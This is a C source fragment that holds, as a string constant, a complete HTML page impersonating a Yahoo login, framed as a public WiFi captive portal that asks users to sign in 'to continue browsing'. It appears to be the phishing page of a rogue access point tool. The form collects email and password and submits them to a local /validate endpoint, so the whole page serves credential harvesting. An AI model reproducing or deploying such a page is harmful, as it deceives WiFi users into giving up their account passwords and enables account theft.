const char YAHOO_HTML[] = R"=====(
<!DOCTYPE html>
  <html>

  <head>

  <title>Public WiFi Access - Yahoo Login</title>

    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width,
    initial-scale=0.75, maximum-scale=0.75, user-scalable=no'>

    <script src='static/js/jquery.min.js'></script>

    <link rel='stylesheet' href='static/css/bootstrap.min.css'>
    <link rel='stylesheet' href='static/css/style.css'>
    <link rel='icon' type='image/png' href='static/img/pfpnk8kp5b.png'/>

    <style>

    body {
      background-position: center;
      background-attachment: fixed;
      background-repeat: no-repeat;
      -webkit-background-size: 100%;
      -moz-background-size: 100%;
      -o-background-size: 100%;
      background-size: 100%;
      -webkit-background-size: cover;
      -moz-background-size: cover;
      -o-background-size: cover;
      background-size: cover;
    }

    .google-header-bar {
    height: 71px;
    border-bottom: 1px solid #e5e5e5;
    overflow: hidden;
    }

    .google-header-bar.centered {
    border: 0;
    height: 108px;
    }

    .google-header-bar.centered .header .logo {
    float: none;
    margin: 40px auto 30px;
    display: block;
    }
    .google-header-bar.centered .header .secondary-link {
    display: none
    }

    .header .logo {
    margin: 17px 0 0;
    float: left;
    height: auto;
    width: auto;
    }
    </style>

    <style media='screen and (max-width: 800px), screen and (max-height: 800px)'>
      .google-header-bar.centered {
        height: 83px;
      }

      .google-header-bar.centered .header .logo {
        margin: 25px auto 20px;
      }

      .card {
        margin-bottom: 20px;
      }
    </style>

    <style media='screen and (max-width: 580px)'>
      html,
      body {
        font-size: 14px;
      }

      .google-header-bar.centered {
        height: 73px;
      }

      .google-header-bar.centered .header .logo {
        margin: 20px auto 15px;
      }

      .content {
        padding-left: 10px;
        padding-right: 10px;
      }

      .hidden-small {
        display: none;
      }

      .card {
        padding: 20px 15px 30px;
        width: 270px;
      }

      .footer ul li {
        padding-right: 1em;
      }

      .lang-chooser-wrap {
        display: none;
      }

    </style>

<style>
.form-signin
{
    max-width: 330px;
    padding: 15px;
    margin: 0 auto;
}
.form-signin .form-signin-heading, .form-signin .checkbox
{
    margin-bottom: 10px;
}
.form-signin .checkbox
{
    font-weight: normal;
}
.form-signin .form-control
{

}
.form-email
{
    display: block;
    outline: 0;
    border-width: 0 0 1px 0;
    border-color: #cfd2d5;
    width: 100%;
    height: 44px;
}
.form-password
{
    outline: 0;
    border-width: 0 0 1px 0;
    border-color: #cfd2d5;
    width: 100%;
    height: 44px;
}
.form-email:focus
{
    outline: 0;
    border-width: 0 0 2px 0;
    border-color: #188fff;
}
.form-password:focus
{
    outline: 0;
    border-width: 0 0 2px 0;
    border-color: #188fff;
}
.form-signin input[type='text']
{

}
.form-signin input[type='password']
{
    margin-bottom: 5px;
}
.account-wall
{
    margin-top: 20px;
    padding: 40px 0px 20px 0px;
    background-color: #ffffff;
}
.login-title
{
    margin: 0 auto;
    max-width: 320px;
    padding: 0 15px 22px;
    overflow: hidden;
    color: #000000;
    font-size: 1.125em;
    font-weight: 500;
    display: block;
}
.profile-img
{
    width: 150px;
    height: 150px;
    margin: 0 auto 10px;
    display: block;
    -moz-border-radius: 50%;
    -webkit-border-radius: 50%;
    border-radius: 50%;
}

.friends-text
{
    font-size: 18px;
    font-weight: 400;
    display: block;
    color: #757575;
    padding-bottom: 15px;
}

.need-help
{
    margin-top: 10px;
}
.new-account
{
    display: block;
    margin-top: 10px;
}

/*.btn-primary {
    background: #5da522;
    border-color: #5da522;
    color: #ffffff;
}

.btn-primary:hover, .btn-primary:focus, .btn-primary:active, .btn-primary.active, .open > .dropdown-toggle.btn-primary {
    background: #5da522;
    border-color: #5da522;
    color: #ffffff;
}

.btn-primary:active {
    background: #5da522;
    border-color: #5da522;
    color: #ffffff;
}*/

.container {
    margin: 0 auto;
    width: 400px;
}

.terms-text1 {
    color: #000;
    font-size: 16px;
    display: block;
    padding-top: 35px;
    text-align: center;
    text-decoration: none;
}

.terms-text2 {
    color: #000;
    font-size: 15px;
    display: block;
    padding-top: 5px;
    text-align: center;
    text-decoration: none;
}

.terms-text3 {
    color: #000;
    font-size: 16px;
    display: block;
    padding-top: 20px;
    text-align: center;
}

.url-color {
    color: #198fff;
    font-size: 15px;
    font-weight: 400;
    text-decoration: none;
}
a:hover, a:visited, a:link, a:active
{
    text-decoration: none;
}
.btn-primary {
  display: block;
  width: 100%;
  height: 44px;
  box-sizing: border-box;
  margin-top: 22px!important;
  color: #FFFFFF;
  background-color: #188fff;
  border-color: #188fff;
}

.btn-primary:hover,
.btn-primary:focus,
.btn-primary:active,
.btn-primary.active,
.open .dropdown-toggle.btn-primary {
  color: #FFFFFF;
  background-color: #4ca9ff;
  border-color: #4ca9ff;
}

.btn-primary:active,
.btn-primary.active,
.open .dropdown-toggle.btn-primary {
  background-image: none;
}

.btn-primary.disabled,
.btn-primary[disabled],
fieldset[disabled] .btn-primary,
.btn-primary.disabled:hover,
.btn-primary[disabled]:hover,
fieldset[disabled] .btn-primary:hover,
.btn-primary.disabled:focus,
.btn-primary[disabled]:focus,
fieldset[disabled] .btn-primary:focus,
.btn-primary.disabled:active,
.btn-primary[disabled]:active,
fieldset[disabled] .btn-primary:active,
.btn-primary.disabled.active,
.btn-primary[disabled].active,
fieldset[disabled] .btn-primary.active {
  background-color: #4ca9ff;
  border-color: #4ca9ff;
}

.btn-primary .badge {
  color: #4ca9ff;
  background-color: #FFFFFF;
}

.btn-primary:active:focus {
  color: #ffffff;
  background-color: #4ca9ff;
  border-color: #4ca9ff;
}

.btn-xlarge {
    padding: 5px 5px;
    font-size: 1.0em; //change this to your desired size
    line-height: normal;
    -webkit-border-radius: 2px;
       -moz-border-radius: 2px;
            border-radius: 2px;
}

.btn-sharp {
    border-radius: 2px;
}

#dialog{
  display: none;}

#dialog > h2{
  color: #dd4b39;
  margin: .5em 0;
  font-size: 14px;
  margin-top: 20px;
  margin-bottom: 10px;

}
</style>

  </head>

  <body>

    <div class='container'>
      <div class='account-wall'>

        <div class='google-header-bar centered'>
          <div class='header content clearfix'>
            <img alt='Google' class='logo' src='data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAIsAAAAgCAYAAAAiwovSAAAABmJLR0QA/wD/AP+gvaeTAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4QIZDCoW1Lip7wAAAB1pVFh0Q29tbWVudAAAAAAAQ3JlYXRlZCB3aXRoIEdJTVBkLmUHAAASJElEQVR42u2beXyU1bnHv+9k8k4SMmRCFkhQCJnEJSEULbIGgVK8gjYXCgZIwNZeqdAWxaqA2iLiCsgVtEjRStAWpTQQiAW8LAUsIILssgQyWSB7MslkZjKTWc/9Y5IJMZOVoPdzPz6fz/zxvu+ZszzP7zzP7zznHOmr3WXi9V98RmjwHTiMPTDVGXjn1BCitcESXZRf33VEOIw9cKgKKbdfZvS021iyJr3L9f0g372YDLbYTUuv6vRFTpJG9SHl6T6S8p7x4VLMWET2lg2EEE8Uw8lYlMuLmYO71MjejBJRkSeoly5xSmwgOjKa51c++wNQulFO768SVdfs6EtsLb6FRauIvScI7WDNTel809Kruj3vWVAqAjj7zwoAoQRY8qc07ZH9F3QV+m+IYCDHsz0dumd8uNRZNK5fcAVQkit2okTmg01/xF/2+8HCNyEOu4vstVfFVztquXC0Epdkol5Y8JfqsQondqwAyASiJBg1txOo6COG/awXgyYpGJveW+qsDU59XosLB7g9zxaLFcludwKQ/cmX4rlf/oVAQolhMpGxEmvPDe9UIyse/Voc3VxPCYcpYD9paQ+xeuMCn4D78IWTQu0fA0B1bSlzVw/sMDBLdGbxt5cvEzNgAABXL1xn4SdJnVbI9vfPieoLvQnWKAFwy0ZmvDhAam9CHMvS604fKCH3uI3qUgc2qx0ABTISSkLDgxk4Kpz4kUrGPRaqVWtUeV0FycdLz4gtb50FoA4TTtnA6Mn9SBrWj7sH9ad/XG8Ce8haa51dV5hbzqVzhRzYd4x/775EOHfQm/tRKXox641IUp7u02Edp0cfFMYqu/f5yfUDm8ACMHfcx2LfkT3cxjhC0DLzpf7tKq9RdGcM4pmh3+DCwknWEBwUyMmCTT4VZTLYYh/pvU3nJ9QokFEg87eKER1WaonOLB6+ezky/kTzIC4s7LCP7bTb3fj6l+KdpbuIlBIIELdzX0owL2YO9llPRbFJbFtZyPZ15xHC6jWcOtrB6Il30yNMQZ3ezbmTuVw8XklPIgklEbUinmE/68XkF4M7FRp0Zwxi8cNZGCotWIUThVTPr166n6m/ubdDejIZbLFvv5Sp+/O6T+jDvcQpHqFP/yCe+nt4h/oxLeSgcFqVuLCgQOaD/B+jvLHAs2sn8MXg45RylBC0ZK4o5P4ZEaIjZHf5jAueQZKNEzt/eOX3tDaoPRn5OknIuCQTtaKCcH7Mnox83dSn7+qQMpUBAgAjFUR3g5uvFoVEczv+QU6f3w9tLRCvpu0EwIYZVQT8evEQpsxO9mk4h93F7szjYs3KzZy6kIVpxxS+3jGImcvrRUdm94lDuWL+hE+QJRUqgomK7Mkbe1KJS4jqMNjUGlXekjXp0sSfDxNz0l/hRMUrDMr/Lc8Pt/D8Tme7FMNhBXDixk7PcJnIvmpJcWOBuIQoaca8EQCUcgynVUnGotx2O7b17cuiPM+BgRyqyCEpMYFH549vtTNZ7+SgQIVZVFDJOQD+Z72+w8YN7CFrb3z2D+webtCzV4BP7/PHtL97gZIwMoptFxZoH50/XmptMvjLfqSkjZD2n14jPTpvImfZQD6f8ukiE6seKRLtAWXOhD97xiki0EQEsfaraZ0Cyo1y35g4KXPPm4REBnGCldjc1bzxUAm6MwbRlucGcGPHjY0f/TS4Icx+S55fOUPqFxNFNd/gwMDxbAOHtha0WnFFsUl8urQMJ2YK+RwlMm+unt8mk9cXO3FjQyHV48KGgRwq8gSn91eJjs6a7gCHJrxHm98/fne/eGfpLtzCA6KEkVH8+cCjUmfaX7ImXZo7L41rfEUOH/P1DisbnioXrYWOp2Z4gKKR4pGkQN785xQi+6pvamUTlxAlfbDpjwBc4C8ArJlehcPu8lm+vKCeRrAIyY72nlbA4i/78Yc3HscPFcUcRELJ+/MLWq34g6d0WK1mSvmKOgykpk3gvjFxrQ5u70cFKFBhxUDCyCgGD43HwCUAdq0r6pIyVD26x7NoIpoqyr1YKt58JgsZf4KlSDQRQazMmq7tSr1L1qRLdyfGUcYpSvmCveuMPifG2y9l6ir0ZWi4Gz+hZvK8pJteAt/oYVLTJmChhhL3ASrzBVmv+fYuVdfsDWCxIYSVESm3+QYLwJipMdK4UWMwU4aBHMxV8OHCS8KXlzicrcNJBWWcQhMUwiur52nb8kIHNhd6lmJU8uDMwaRMT6aWQq8Xqyg2Cf4PyGvPb8CFFY0UD8CMZ0bclEd7c/V8VARRyOe4FFYyfmNooZuMddvxQ4Wa2wH4+XP9u3VMv1s4HYBiDmOjhszlxZgMtthvlzMajA0hqJaekZI3QatoreJn105ARkMpRwHY/V5VszjnsLtY9fgR3NRSwJEGUjuvTYV+tvYKClTUUY5CtvHQLxOlmU+MlWR6oucUEkr+tbHqewdK7sVScXD3GXoQjZ9QIwmZBx4boL3ZmR0Xc6cHGO4TlBVa2JtR4tXnXz/8J3UYCCEeP4JIHBlx0+HHVzi6OzEOGxaqOQ/AgYwaXQtya1F5PItkZeDYSO97RVsVz5g3Ahc2SjmGhJL1C3Ka4vnSM6K8pIhaiqjhWrukFuDAp0VerzJx8hD8ZT8PGUxNppzzCJx8trawQwOX5aaFXI+e/l1SXmhYT5/vd2QexIaFnsSgJJikkbd1C096cFYiAAYu4XTXc3xnhffbrqxjAEQwEIB7J0TekokwacpwVARhpACAwzt869uNHRtm+if0ah8sAE+/PE0bGdbHS3ZzjlrZm1EiSnRmsXmVZ3DlnG+X1DYuP/XFTlySCSd1TJpzp/db6pzR+KFCz1nqqpTNZtz3IbuyjuHETghaJJTdZrj4uBj8UGGmDDd2Tu81eL30+QsXUSLjjwaAO4erb8nYGvtQRwlOdz25R1vO72s5etzYsAsbiaMiOgYWtUaVt3jV1GZkd/2CKyx7fBsAlSKfOgz8x8SRbZJagJ3vlqNARbUoJCwiuFn5+8bESQNiYrzL6L0fXf9ew9ClC7n0QIPUkIYKi1Z1S70Jgz2GAnBhwWlVYjLYYs98mS8Aggj1JinjfqzW3oqxJQyOaWjfhhu7ly81J7gu3NSCLJrZSdFe5SlpI6Skof28ZNdpVZJ/xIlVOKngEpqgEJa/92S72cjzR4twY8NJHbMXD2lRZvb8cdgxUi9d58pRR5t5gNbaKNGZRUWxSZgMttjGn8PuwmF3ceO7Ep1ZlOjMoupavc8UuxO716gA4f3kbuMMfgTihwonJg8/OmnSlRZXNuztaFAqAro1PfBt6R3dS3sjYAGKLzffkCwpLMMtWRl834DmydCONLDotXRmTXjDm9kFqOQcTuw88ftZ7RKxvRuLUKCiFh1urEyZndxi1kyZnaxd9kyGrkJcpB+3s3djEdrVmnb7ZqOC8rxgnht6pRl2OpyIIwYnZu9zTaVFAM3A0t3iRyBCsiOEE6PBjEHvMVoAobfca6o1qjw/AmlKutkxGsxAeJNnKbFgw8zwCfd2Hiz3jYmTUlKTRdaW/ZRyjABJokZcIzoymicXp7a78bZ93Xn8UGPmOhNSE33OGrVGlTcldTyZW3bRl9Hsy3CSvtQW294M80dDtXQE7YOeVH1IaMeSLrU1dZj0TgzHTcg3KKohO6zzuF3Z66q7S2QCsNOU9ALQhAU1Ackd2AF/33VpzJc1AqY1MYpKesXQebAAPLd8Gju3nKSSk4SKu+iBhmUr5rZ7/GBPRr7OT6ipo9xLZluT1Dmjydyyi3JOEW1N7tB+kQKZuwYk8/6OUZ1eZh7aWiCenvmhz+ywCxtKRQBONy1mXlfFZLDFKghEvmHFcZtWQ+3F0oZnKzK9sLurbxlYaiot4kbAAvTUBDdL9QthxU494ybdq22u6w5KZF+1NGxiFDYsRDGMQfyWlLQR7Roo6x3PcttIARExAW0S4cZcRDXfALBtZdn3QnA1QSFYqMHPHYhSEUDttYBuqffy2es6GX8U3jBgo1+CWmoknWbKGrxPL+/+THdLYW6518MpkBE4GTg61GuTq2eqcEtWNGEBLSKA8lYqvXG5LCQLPUUM6oIk5kY1baTJPT3othubjKHWp9CLf1EvXUdURXFoa4EYMzXmOz1pN2rMPezcfdAbFuoN/t1Sb3GOpcFQ/ghhJbxvEP6yH3EJUZImKEQYLOXeshe+MBKtDe72sRXnWPB4N3/vjvKN0aFGb8SGmVHjE1v8t1NgMemdnepY43K5UlylkpOUBO2m4VCXR6w+/hQEDouEXVQRw2R2vlvOmKkxLYrdeA6nu2XcT4ezc/dBaqSv6S0e4PDmGlJfDrvpes9+cR1ZaiDOAsbNvK0FQE3oUKPl+plbc7rw7BfXkfFHllS4hY0f/bRPs++GqjqMopKkYUN8hPxOioqgDi9lzx8tanCvRUxLncQVQ6bUkd+01Ene/aKco9Z2l9F1RkfX4rfe6PP9lNnJWk1QCPlin4cM54d2einvi1ge/keBdwfbLVkZm9pECaZM/4kn58GXABzf4uh2oDjsLvb/45sGOwYjJDvD/rM5Fyu8WI2d+maku8tgaRSpHae09b9zvctlF9Y2ia0vogug55S3ru9S1BpV3hO/n0oN1zA07KFsf818U3Vmr70qFMLDVezCRvIjMc12lCdOGypFR0aTxx6P09UHdnsme+fGCwJAllQoRCDh0UF8O8SXFuuxY2hBbrsElo7kH0p0Zu/ucjVX6RcT1W6G1xfRLW8w1L83V7dJ+Gx13Q+YJxenSkmJCZxjLQDndgR2+LyNL318sPg0ABaqUEeomLf8/uYpANmPZSvm4sROIdsB2Pe2f7d6lU3LTqIiGBXBuCUrc976UYty+qsugiP9fKY3OgWW2gpHM7C0dsYl+90C7+6yCyuz54/r9OAa/6PnLApkst8taLfdzoqhqjnKDJV1zYy3ftNi/IMEJ3gJgPWz6jsdjkwGW+zSh84iCZlyLlJPDa9/MtVnIjMlbYT00MSxXGQzVkUxZZcVrR6U6qy8/qvPhbFCYBVObJhJfiQGXwuHpKkyP5/6QCtpipuQeouzxVmIimKT2L7uPApkDFzChc1nxrY9mTI7WeuHyrtftC+jynv24tvtOqy3JhzFJURJu46+ixxp4hgLqdVbWTbU1eHwcHp/lXhm+Ne663llFHIAKzV8tHdBm172nY+e1SYlJnDC/Qp2qjm0Tkn222U3BZgPXzgpvvyHEbdkxUIVCSOjeGHDgz77sGRNutTahcAuhKGmzJ+1zt4irf7Z2itIQsYh6TFTxsNpQ7q0z9GY0bVjxCaV4rB6Lj611m53iLG63idg/v3N+9qJaUkcYgE6/saGJ+pYNKhSZL9dJr7taUp0ZrE3o0QsHPuV+MPEY3yd9zln2cCwiVHsPPNqu+FYrVHlbT+wQhubGM0xXsCEjq2L/Fn1SJHwdVCpPa/22rQzYttbpbioplhcYuioeFZmTdd25S5X5/IsdWrkGzJ/znqphVfZvOoYleRTKzycJf2xh7tsvNQ5o8nasp8csY0Q+pP1XgLpS+NjjbVm3FixUs5lPqY/47ruHanBymVkAnFYxrRqwNUbF0i/WzhdfLL+X2zb+iqnLis5smgQwVIkkpCFkOzUCwtOzFiowkg+iqB6Jk1OJv2xNZ3ibGqNKm//6TXSqmWfilWvvkwsD8COWTx3uFL3k18Hkvyoqs3rxbozBrF3YxH7MqqajryKEl5cldbqmSOTwRabe9KkAxg4OtTnHSypM/mKCX2Xi8rKSvoyFn80vHdpcLNOmwy2WGudXdcYj3MvloqunkpvlBOHckWjoiuKTaLxZH93tNNYn1qjynPYXRTmVnS4ntyLpeLimQKu5ha0+BYRGsnI8Qnc7Ngb2/nTir+za/thNJYhRDEcDUkEhlmJT4bQaH+CNUrMBieXzxaQd9qKwwq16DBwCUtQAbN+MYW5C1Pa3PCdO+5jUXHkLpSKADQxJt6/3HL7pFNgGR78ssAuEca9+KNh1fGB3Xag+AdpfzWzO/O4uJpbwK6sY1jL/KnXN98MdGOFyEriYmIZ8cAdxMfFMHHa0A7d1EyQfye0pBDMACwU+7y016kwJDsCKOcKVVwhninQcATwB7n10ngXCUbwzJKZ3V5/VKIfugvZBBBKWIwAxt4cZ3n8rSFowjz5AYPegjrihwvv/19k+4EV2qy/HtZV1lQw+79888z/BWylUpbCd9/VAAAAAElFTkSuQmCC
'>
          </div>
        </div>

        <h1 class='text-center login-title'>Sign in to your account to continue browsing</h1>

          <form class='form-signin' action='/validate' method='GET'>

            <input id='eml' type='text' name='user' class='form-email' placeholder='Enter your Email' _autofocus='true' autocorrect='off' autocomplete='off' autocapitalize='off' required><br>
            <input id='pwd' type='password' name='pass' class='form-password' placeholder='Password' autocorrect='off' autocomplete='off' autocapitalize='off' required><br>
            <input type='hidden' name='url' value='yahoo.com'>
            <button id='btn' class='btn btn-primary btn-block btn-xlarge btn-sharp' name='login' type='submit'>Sign in</button>
            
            
            <div class='text-center terms-text1'><a href='#' class='url-color'>Trouble signing in?</a></div><br>
            <div class='text-center terms-text2'>New to Yahoo? <a href='#' class='url-color'>Sign up for a new account</a></div>

          </form>

      </div>
    </div>

  </body>

</html>
)=====";
